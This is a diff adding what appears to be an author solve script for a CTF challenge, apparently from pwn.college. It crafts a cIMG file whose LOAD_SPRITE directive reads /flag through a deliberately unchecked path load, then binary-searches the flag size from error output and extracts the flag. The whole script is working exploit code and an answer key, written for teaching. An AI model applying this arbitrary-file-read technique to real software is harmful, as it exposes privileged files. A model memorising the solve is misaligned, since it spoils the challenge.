@@ -1,0 +1,56 @@
+{%- import "cimg_lib.j2" as lib -%}
+#!/usr/bin/env python3
+"""Author solve for cIMG "sprite-load": the LOAD_SPRITE directive opens an
+arbitrary path and (because this build skips the safety checks) loads its bytes
+straight into a sprite. Load /flag and render it.
+
+The solver can't read /flag itself (it runs unprivileged), so it doesn't know
+the flag length. LOAD_SPRITE reads exactly width*height bytes, so it binary
+searches for the largest width the load accepts -- i.e. the flag file size --
+which renders the whole flag.
+"""
+import re
+import subprocess
+
+
+def pack(value, bits):
+    return int(value).to_bytes(bits // 8, "little")
+
+
+LOAD_SPRITE = pack({{ c.directives["LOAD_SPRITE"] }}, 16)
+RENDER_SPRITE = pack({{ c.directives["RENDER_SPRITE"] }}, 16)
+
+
+def run_with_width(width):
+    body = bytearray({{ c.magic | tojson }}.encode("latin1"))
+    body += pack({{ c.version }}, {{ c.version_bitwidth }})
+    body += bytes([width, 1])  # framebuffer width, height
+    body += pack(2, {{ c.directives_bitwidth }})  # two directives follow
+    body += LOAD_SPRITE + bytes([0, width, 1]) + b"/flag".ljust(255, b"\0")
+    body += RENDER_SPRITE + bytes([0, 255, 255, 255, 0, 0, 1, 1, 0])
+    with open("/tmp/solve.cimg", "wb") as handle:
+        handle.write(body)
+    result = subprocess.run(
+        ["/challenge/cimg", "/tmp/solve.cimg"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        timeout=30,
+    )
+    return re.sub(r"\x1b\[[0-9;]*m", "", result.stdout.decode("latin1"))
+
+
+# Largest width whose load succeeds == the size of /flag, which renders it all.
+lo, hi, best = 1, 255, ""
+while lo <= hi:
+    mid = (lo + hi) // 2
+    output = run_with_width(mid)
+    if "Failed to read" not in output and "failed to open" not in output:
+        best = output
+        lo = mid + 1
+    else:
+        hi = mid - 1
+
+print(best[-500:])
+match = re.search(r"pwn\.college\{[^}\n]+\}", best)
+assert match, "flag not rendered"
+print(f"Flag: {match.group(0)}")
